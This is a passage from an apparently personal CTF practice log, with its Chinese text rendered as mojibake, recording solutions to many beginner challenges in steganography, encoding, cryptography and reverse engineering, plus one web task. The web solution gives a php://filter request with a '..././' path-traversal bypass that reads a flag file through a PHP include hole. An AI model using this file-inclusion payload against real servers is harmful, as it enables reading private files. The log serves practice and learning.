if(!isset($file))</span><br><span class="line">        $file = &#x27;1&#x27;;</span><br><span class="line">    $file = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $file);</span><br><span class="line">    include_once($file.&quot;.php&quot;);</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>ç»•è¿‡-&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=..././..././..././..././flag</span><br></pre></td></tr></table></figure><p>PD9waHANCiAgICAkZmxhZyA9ICJmbGFnezkyZWI1ZmZlZTZhZTJmZWMzYWQ3MWM3Nzc1MzE1NzhmfSI7DQo&#x2F;Pg&#x3D;&#x3D;ï¼ˆbase64ï¼‰è§£å¯†ï¼š</p><p>flag{92eb5ffee6ae2fec3ad71c777531578f}</p><h3 id="0å’Œ255"><a href="#0å’Œ255" class="headerlink" title="0å’Œ255"></a>0å’Œ255</h3><p><strong>ç¨‹åºé€†å‘</strong> </p><p>å°å°çš„ç¨‹åºé€†å‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding = utf-8 -*-</span><br><span class="line"># @software:PyCharm</span><br><span class="line">from PIL import Image</span><br><span class="line">image = Image.open(&#x27;flag.png&#x27;)   #flag.pngåˆ†è¾¨ç‡ä¸º33*33</span><br><span class="line">width = image.width</span><br><span class="line">height = image.height</span><br><span class="line">image_list = []</span><br><span class="line">for x in range(height):</span><br><span class="line">    scanline_list = []</span><br><span class="line">    for y in range(width):</span><br><span class="line">        pixel = image.getpixel((y, x))</span><br><span class="line">        scanline_list.append(pixel)</span><br><span class="line">    image_list.append(scanline_list)</span><br><span class="line">print(image_list)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding = utf-8 -*-</span><br><span class="line"># @software:PyCharm</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">image_list =[...]</span><br><span class="line">width = len(image_list[0])</span><br><span class="line">height = len(image_list)</span><br><span class="line">new_image = Image.new(&#x27;RGB&#x27;, (width, height))</span><br><span class="line">for x in range(height):</span><br><span class="line">    for y in range(width):</span><br><span class="line">        pixel = image_list[x][y]</span><br><span class="line">        new_image.putpixel((y, x), pixel)</span><br><span class="line"></span><br><span class="line">new_image.save(&#x27;flag.png&#x27;)</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ï¼šPolar_Night</p><p>å¾—åˆ°å­—ç¬¦ä¸²MD5åŠ å¯†å¥—ä¸Šflag</p><h2 id="2024-x2F-01-x2F-16"><a href="#2024-x2F-01-x2F-16" class="headerlink" title="2024&#x2F;01&#x2F;16"></a>2024&#x2F;01&#x2F;16</h2><h3 id="docxéšå†™"><a href="#docxéšå†™" class="headerlink" title="docxéšå†™"></a>docxéšå†™</h3><p><strong>docx éšå†™</strong></p><blockquote><p><code>docx</code>éšå†™çš„ä¸»è¦è€ƒå¯Ÿæ–¹å¼æœ‰ï¼š</p><p>â€‹1.docxæ–‡ä»¶çš„æœ¬è´¨æ˜¯å‹ç¼©åŒ…ï¼Œå…¶å†…å¯å­˜å‚¨æ–‡ä»¶ã€‚</p><p>â€‹2.docxå†…å°†æ–‡å­—é¢œè‰²æ”¹é€æ˜å®ç°éšè—ã€‚</p><p>â€‹3.<code>office</code>å’Œ<code>wps</code>å‡æ”¯æŒ<code>docx</code>æ–‡ä»¶çš„éšè—æ–‡å­—åŠŸèƒ½ï¼Œé€šè¿‡è®¾ç½®å¯ä»¥çœ‹åˆ°éšè—çš„æ–‡å­—ã€‚</p></blockquote><p>çŒœåˆ°äº†1ã€2ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°3</p><p>è›®å¥½ç©çš„ã€‚</p><h3 id="è¶…çº§ç®€å•çš„æµé‡"><a href="#è¶…çº§ç®€å•çš„æµé‡" class="headerlink" title="è¶…çº§ç®€å•çš„æµé‡"></a>è¶…çº§ç®€å•çš„æµé‡</h3><p>ç¡®å®ç®€å•â€”è¿½è¸ªtcpæµâ€“<code>tcp.stream eq 2</code></p><h3 id="100RGB"><a href="#100RGB" class="headerlink" title="100RGB"></a>100RGB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ğŸ¯ğŸ©ğŸ£ğŸ®ğŸ¨ğŸ£ğŸ­ğŸ­</span><br><span class="line">ğŸ¨ğŸ§ğŸ©ğŸ£ğŸ¨ğŸ§ğŸ¯ğŸ£ğŸ°ğŸ®</span><br><span class="line">ğŸ¨ğŸ§ğŸªğŸ£ğŸ¨ğŸ©ğŸªğŸ£ğŸ­ğŸ¬</span><br><span class="line">ğŸ¨ğŸ¨ğŸ§ğŸ£ğŸ«ğŸ°ğŸ£ğŸ¨ğŸ§ğŸ°</span><br><span class="line">ğŸ°ğŸ®ğŸ£ğŸ«ğŸ°ğŸ£ğŸ¨ğŸ¨ğŸ¬</span><br><span class="line">ğŸªğŸ©ğŸ£ğŸ°ğŸ¬ğŸ£ğŸ°ğŸ®</span><br><span class="line"> ğŸ¨ğŸ¨ğŸ«ğŸ£ğŸ¬ğŸ¨ğŸ£ğŸ°ğŸ¬</span><br><span class="line">ğŸ°ğŸ°ğŸ£ğŸ¨ğŸ¨ğŸ®ğŸ£ğŸ«ğŸª</span><br><span class="line">ğŸ¨ğŸ§ğŸ¨ğŸ£ğŸ¨ğŸ©ğŸ¬ğŸ£ğŸ§</span><br></pre></td></tr></table></figure><p>..æˆ‘æ‡‚äº†ï¼Œbase100å•Šã€‚base100æ˜¯emojiåŠ å¯†</p><p>è®°å¾—åˆ é™¤æ¢è¡Œã€‚</p><p>ç„¶åå°±æ˜¯asciiè§£å¯†ï¼ˆ16è¿›åˆ¶</p><p>â€¦â€¦</p><p>åé¢å†™äº†å‡ é“èšŒåŸ ä½äº†ï¼Œå»ç”»ç”»äº†å˜¿å˜¿</p><h2 id="2024-x2F-01-x2F-17"><a href="#2024-x2F-01-x2F-17" class="headerlink" title="2024&#x2F;01&#x2F;17"></a>2024&#x2F;01&#x2F;17</h2><p>ctfshowåšäº†å‡ é“ï¼ˆçªç„¶å‘ç°çš„å°é¢˜åº“ï¼ˆå¥½ç©ï¼ˆï¼ˆæ¬¸å˜¿</p><h3 id="æ‚é¡¹ç­¾åˆ°"><a href="#æ‚é¡¹ç­¾åˆ°" class="headerlink" title="æ‚é¡¹ç­¾åˆ°"></a>æ‚é¡¹ç­¾åˆ°</h3><p>ç›´æ¥æ‹–winhex</p><h3 id="æŸåçš„å‹ç¼©åŒ…"><a href="#æŸåçš„å‹ç¼©åŒ…" class="headerlink" title="æŸåçš„å‹ç¼©åŒ…"></a>æŸåçš„å‹ç¼©åŒ…</h3><p>æ‹–winhexâ€“pngâ€“æ”¹äº†åç¼€â€“flag</p><h2 id="2024-x2F-01-x2F-19"><a href="#2024-x2F-01-x2F-19" class="headerlink" title="2024&#x2F;01&#x2F;19"></a>2024&#x2F;01&#x2F;19</h2><p>?åšçš„é¢˜åˆæ²¡è®°å½•ï¼Ÿ</p><p>å¥½åƒæ˜¯ä»€ä¹ˆã€‚</p><h3 id="è¿·ä¹‹æ …æ "><a href="#è¿·ä¹‹æ …æ " class="headerlink" title="è¿·ä¹‹æ …æ "></a>è¿·ä¹‹æ …æ </h3><p><a href="http://t.csdnimg.cn/BtcMt">è¿™é‡Œæ”¾ä¸ªç ´è§£010çš„è¿‡ç¨‹ï¼Œæœ‰æ—¶é—´è¯»è¯»</a></p><p>ä½¿ç”¨010editorçš„æ–‡ä»¶æ¯”è¾ƒåŠŸèƒ½æ‰¾åˆ°ä¸¤å¼ å›¾ç‰‡çš„åå…­è¿›åˆ¶ä¸åŒç‚¹ï¼ŒæŒ‰é¡ºåºäº’ç›¸å–ä¸€ä½æ•°æˆ–è€…æ …æ 2ä½è§£å¾—flag</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240121000329395.png" alt="image-20240121000329395"></p><h3 id="ä½ ä¼šæ•°æ•°å—"><a href="#ä½ ä¼šæ•°æ•°å—" class="headerlink" title="ä½ ä¼šæ•°æ•°å—"></a>ä½ ä¼šæ•°æ•°å—</h3><p>ä½¿ç”¨010editorçš„ å·¥å…·â†’ç›´æ–¹å›¾ ç»Ÿè®¡è®¡æ•°è§£å¾—flagï¼Œæˆ–è€…å¤åˆ¶å‡ºæ¥è¯é¢‘ç»Ÿè®¡</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240121000544233.png" alt="image-20240121000544233"></p><h2 id="2024-x2F-01-x2F-20"><a href="#2024-x2F-01-x2F-20" class="headerlink" title="2024&#x2F;01&#x2F;20"></a>2024&#x2F;01&#x2F;20</h2><h3 id="ä½ ä¼šå¼‚æˆ–å—"><a href="#ä½ ä¼šå¼‚æˆ–å—" class="headerlink" title="ä½ ä¼šå¼‚æˆ–å—"></a>ä½ ä¼šå¼‚æˆ–å—</h3><p>å›¾ç‰‡16è¿›åˆ¶0x50å¼‚æˆ–</p><h3 id="flagä¸€åˆ†ä¸ºäºŒ"><a href="#flagä¸€åˆ†ä¸ºäºŒ" class="headerlink" title="flagä¸€åˆ†ä¸ºäºŒ"></a>flagä¸€åˆ†ä¸ºäºŒ</h3><p>å‰åŠwatermarkï¼ŒååŠæ”¹é«˜åº¦</p><h3 id="æ‰“ä¸å¼€çš„å›¾"><a href="#æ‰“ä¸å¼€çš„å›¾" class="headerlink" title="æ‰“ä¸å¼€çš„å›¾"></a>æ‰“ä¸å¼€çš„å›¾</h3><p>pngæ–‡ä»¶å¼€å¤´åº”è¯¥æ˜¯89 50 4E 47ï¼Œè§‚å¯Ÿä¸‹é¢˜ç›®ç»™çš„pngçš„å¼€å¤´æ˜¯77 B0 B2 B9ï¼Œä¼šå‘ç°0x89+0x77&#x3D;0x100, 0x50+0xB0&#x3D;0x100, 0x4E+0xB2&#x3D;0x100, 0x47+0xB9&#x3D;0x100, æ‰€ä»¥ï¼Œåªè¦ç”¨0x100å‡å»ç°åœ¨pngæ–‡ä»¶ä¸­çš„æ¯ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°å³å¯æ¢å¤å‡ºå¯ä»¥é¢„è§ˆçš„pngå›¾ç‰‡ã€‚<br>ä½†æ˜¯è¦æ³¨æ„è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘ï¼Œå°±æ˜¯0x100æ˜¯åè¿›åˆ¶æ•°çš„256ï¼Œè€Œbytesæ ¼å¼æœ€å¤§åªèƒ½è¡¨ç¤ºåˆ°255ï¼Œå‡ºç°256ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥é¢˜ç›®åŸpngæ–‡ä»¶ä¸­æ˜¯0çš„ä½ç½®ï¼Œè¿˜æ˜¯0ï¼Œä¸èƒ½ç”¨0x100å»å‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;./misc5.5.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data=ff.read()</span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> dd <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> dd==<span class="number">0</span>:</span><br><span class="line">        l.append(dd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l.append(<span class="number">0x100</span>-dd) </span><br><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;./1234.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="comment">#ä¼šæ–°å»ºä¸€ä¸ªå¯å†™å…¥çš„æ–°æ–‡ä»¶1234.png</span></span><br><span class="line">ff.write(<span class="built_in">bytes</span>(l))</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><h2 id="2024-x2F-01-x2F-21"><a href="#2024-x2F-01-x2F-21" class="headerlink" title="2024&#x2F;01&#x2F;21"></a>2024&#x2F;01&#x2F;21</h2><h3 id="é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ"><a href="#é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ" class="headerlink" title="é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ"></a>é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ</h3><p>è«æ–¯å¯†ç ï¼Œç™½ä¸Â·ï¼Œé»‘ä¸_ï¼Œè½¬åœºæ˜¯ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .</span><br></pre></td></tr></table></figure><h3 id="æˆ‘åäº†ä½ éšæ„"><a href="#æˆ‘åäº†ä½ éšæ„" class="headerlink" title="æˆ‘åäº†ä½ éšæ„"></a>æˆ‘åäº†ä½ éšæ„</h3><p>å¥½é¢˜ç›®ã€‚<a href="http://330k.github.io/misc_tools/unicode_steganography.html">é›¶å®½è§£å¯†</a></p><h3 id="è¿…ç–¾å“åº”"><a href="#è¿…ç–¾å“åº”" class="headerlink" title="è¿…ç–¾å“åº”"></a>è¿…ç–¾å“åº”</h3><p>ä¸€é“äºŒç»´ç é¢˜ç›®ï¼Œå¾—å­¦å­¦äº†ã€‚ã€‚â€”&gt;<a href="http://t.csdnimg.cn/hNYjT">http://t.csdnimg.cn/hNYjT</a></p><p><a href="https://www.cnblogs.com/SanCai-Newbie/p/16979691.html">ä»–å†™çš„å¥½å¥½ã€‚</a></p><p><a href="https://merri.cx/qrazybox/">QRazyBox</a></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240121223704858.png" alt="image-20240121223704858"></p><h3 id="You-and-me"><a href="#You-and-me" class="headerlink" title="You and me"></a>You and me</h3><p>ç›²æ°´å°ï¼Œä½¿ç”¨å·¥å…· BlindWaterMark-master</p><p>python3 bwmforpy3.py decode you.png you_and_me.png wm2.png</p><p><a href="https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh">https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh</a></p><h2 id="20240122"><a href="#20240122" class="headerlink" title="20240122"></a>20240122</h2><p>ä¸¤ä¸ªå›¾ç‰‡é¢˜ï¼Œå¥½åƒç›´æ¥æ‰”è¯†å›¾é‡Œå°±ok</p><p>è¿˜æœ‰ä¸€ä¸ªre</p><p>ç®€å•rc4åŠ å¯†ï¼Œå¯†é’¥æ˜¯DH<del>mqqvqxB^||zll@Jq</del>jkwpmvez{</p><p>å¯†æ–‡ï¼šÃƒâ€šÂ£%Ã¶L6;YÃŒÃ„Ã©Ã±Âµ2Â±â€“Â®Â¿5</p><p>ä¸æƒ³å†™äº†ï¼Œchatpy</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_with_0x1F</span>(<span class="params">input_str</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">        <span class="comment"># å°†æ¯ä¸ªå­—ç¬¦ä¸0x1Fè¿›è¡Œå¼‚æˆ–æ“ä½œ</span></span><br><span class="line">        xored_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="number">0x1F</span>)</span><br><span class="line">        result += xored_char</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹</span></span><br><span class="line">input_string = <span class="string">&quot;DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;&quot;</span></span><br><span class="line">output_string = xor_with_0x1F(input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;è¾“å…¥å­—ç¬¦ä¸²:&quot;</span>, input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å¼‚æˆ–æ“ä½œåçš„å­—ç¬¦ä¸²:&quot;</span>, output_string)</span><br></pre></td></tr></table></figure><h2 id="20240123"><a href="#20240123" class="headerlink" title="20240123"></a>20240123</h2><h3 id="cryptoç­¾åˆ°"><a href="#cryptoç­¾åˆ°" class="headerlink" title="cryptoç­¾åˆ°"></a>cryptoç­¾åˆ°</h3><p>63746673686f777b77656c636f6d655f325f636169676f755f6375707d</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;63746673686f777b77656c636f6d655f325f636169676f755f6375707d&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.decode())</span><br></pre></td></tr></table></figure><p>16è¿›åˆ¶æ˜¯ascii</p><h3 id="cryptoç­¾åˆ°2"><a href="#cryptoç­¾åˆ°2" class="headerlink" title="cryptoç­¾åˆ°2"></a>cryptoç­¾åˆ°2</h3><p>Ao(mgHX^E)AN2PSBOu3qI0o</p><p>wpï¼š</p><p><strong>Ao(mg</strong>å°±æ˜¯flagç”¨base85ç¼–ç ä¹‹åçš„è¡¨ç¤ºå½¢å¼<br> base85è¿˜æœ‰å„å¼å„æ ·çš„ç¼–ç è¡¨ã€‚ã€‚è¿™æ˜¯ASCII</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&quot;Ao(mgHX^E)AN2PSBOu3qI0o&quot;</span></span><br><span class="line">a=base64.a85decode(a).decode()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h3 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zhofrph wr FWIvkrz yhjhwdeoh grj fxs!</span><br></pre></td></tr></table></figure><p>#3 Welcome to CTFshow vegetable dog cup!</p><h3 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h3><p>å¯†æ–‡ï¼š ğŸ˜«ğŸ™„ğŸ‘°ğŸ˜°ğŸ‘£ğŸ™‹ğŸ˜±ğŸ‘§ğŸ‘ŒğŸ‘·ğŸ‘¯ğŸ‘©ğŸ˜´ğŸ‘–ğŸ‘«ğŸ‘šğŸ™ƒğŸ‘¹ğŸ‘ğŸ‘ğŸ˜¶ğŸ‘³ğŸ˜«ğŸ‘•ğŸ™‚ğŸ™ŠğŸ‘µğŸ‘¶ğŸ‘¨ğŸ‘°ğŸ‘®ğŸ™‰ğŸ‘¶ğŸ‘µğŸ‘¸ğŸ‘²ğŸ‘ºğŸ‘®ğŸ‘‘ğŸ˜¶ğŸ‘´ğŸ˜«ğŸ™ŠğŸ‘«ğŸ˜´ğŸ‘¬ğŸ‘¹ğŸ‘¤ğŸ‘‘ğŸ˜±ğŸ‘—ğŸ™ƒğŸ‘ğŸ˜¶ æç¤ºï¼š æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œæ ‡é¢˜å°±æ˜¯å¯†ç ï¼Ÿ</p><p>wpï¼šç†Ÿæ‚‰çš„emojiè§£å¯†ï¼Œä½†æ˜¯ï¼Œï¼Œ0x36dä¸è¡Œï¼Œæ¢æˆ877</p><h3 id="ç±»å‹-7"><a href="#ç±»å‹-7" class="headerlink" title="ç±»å‹-7"></a>ç±»å‹-7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B</span><br></pre></td></tr></table></figure><p>ctfshow{Wow_u_Kn0w_Ci$c0_Type7_P@ssword!}</p><h3 id="base47"><a href="#base47" class="headerlink" title="base47"></a>base47</h3><p><a href="https://www.cnblogs.com/Guanz/p/17909958.html">å†™çš„å¾ˆå¥½</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"> </span><br><span class="line">ciper = <span class="string">&#x27;E9CV^T+HT5#X36RF4@LAU703+F$E-0N$@68LMXCVDRJJD5@MP#7MUZDTE?WWLG1S#L@+^66H@59KTWYK8TW0RV&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;0123456789ABCDEFGHJKLMNPQRSTUVWXYZ?!@#$%^&amp;*-+&#x27;</span></span><br><span class="line"> </span><br><span class="line">num = <span class="number">0</span>  <span class="comment"># å¯†æ–‡è½¬åè¿›åˆ¶æ•°</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciper)):</span><br><span class="line">    p = key.index(ciper[i])  <span class="comment"># æ‰¾åˆ°æ¯ä¸ªå¯†æ–‡å­—ç¬¦å¯¹åº”å­—å…¸çš„ä¸‹æ ‡</span></span><br><span class="line">    num += p * (<span class="built_in">len</span>(key) ** (<span class="built_in">len</span>(ciper) - i - <span class="number">1</span>))  <span class="comment"># 45è¿›åˆ¶è½¬åè¿›åˆ¶åæ±‚å’Œ</span></span><br><span class="line"> </span><br><span class="line">s = libnum.n2s(num)  <span class="comment"># åè¿›åˆ¶æ•°è½¬å­—ç¬¦ä¸² asciiç è¡¨ 256è¿›åˆ¶</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="PWNç­¾åˆ°é¢˜"><a href="#PWNç­¾åˆ°é¢˜" class="headerlink" title="PWNç­¾åˆ°é¢˜"></a>PWNç­¾åˆ°é¢˜</h3><p>æ¬¸å˜¿ ncè¿‡å»å°±æ˜¯</p><h3 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h3><p><a href="http://t.csdnimg.cn/GMR5G">http://t.csdnimg.cn/GMR5G</a></p><h2 id="20240124"><a href="#20240124" class="headerlink" title="20240124"></a>20240124</h2><h3 id="flagç™½ç»™"><a href="#flagç™½ç»™" class="headerlink" title="flagç™½ç»™"></a>flagç™½ç»™</h3><p>å—¯â€¦çœ‹å‡ºå¥—å£³upxï¼Œç„¶åæ‰¾flag</p><p>æƒ³äº†åŠå¤©ï¼Œä¸çŸ¥é“è¿™ä¸ªåºåˆ—å·å•¥æ„æ€ï¼Œå¯åŠ¨ç¨‹åºæ‰çŸ¥é“ï¼Œ</p><p>è¾“å…¥é”™äº†ï¼ŒæŒ‰ç€è¿™ä¸ªä¸²æ‰¾</p><p>å—¯â€¦â€¦HackAv</p><h3 id="æ•°å­¦ä¸åŠæ ¼"><a href="#æ•°å­¦ä¸åŠæ ¼" class="headerlink" title="æ•°å­¦ä¸åŠæ ¼"></a>æ•°å­¦ä¸åŠæ ¼</h3><p>å—¯â€¦â€¦æ•°å­¦é¢˜ï¼Œ<a href="https://www.cnblogs.com/ethan269/p/ctfshow_re8.html">å¥½é¢˜è§£</a></p><p>æºç¨‹åºä¸å›°éš¾ï¼Œé€»è¾‘æ¸…æ™°</p><p>å…ˆé¢„å®šå‡ ä¸ªå‚æ•°ï¼ˆæ³¨æ„strtolï¼‰ï¼Œå†å‚æ•°è¿ç®—åˆ¤æ–­ï¼Œé€†å‘æ±‚è§£</p><h3 id="ç­¾é€€"><a href="#ç­¾é€€" class="headerlink" title="ç­¾é€€"></a>ç­¾é€€</h3><p><a href="http://t.csdnimg.cn/9c7WX">pycé€†å‘</a></p><p>åœ¨çº¿å·¥å…·åç¼–è¯‘</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;()&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line">    c_bytes = [ <span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes ]</span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(c_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(c_bytes) % <span class="number">3</span></span><br><span class="line">    integral_part = c_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">12</span>,</span><br><span class="line">        <span class="number">18</span>]:</span><br><span class="line">        tmp_unit = [][<span class="built_in">int</span>(tmp_unit[x:x + <span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        resp += <span class="string">&#x27;&#x27;</span>.join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ])</span><br><span class="line">        integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="string">&#x27;&#x27;</span>.join(c_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(remain_part[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="number">12</span>,</span><br><span class="line">            <span class="number">18</span>] ][:remain + <span class="number">1</span>]</span><br><span class="line">        resp += <span class="string">&#x27;&#x27;</span>.join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> rend(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 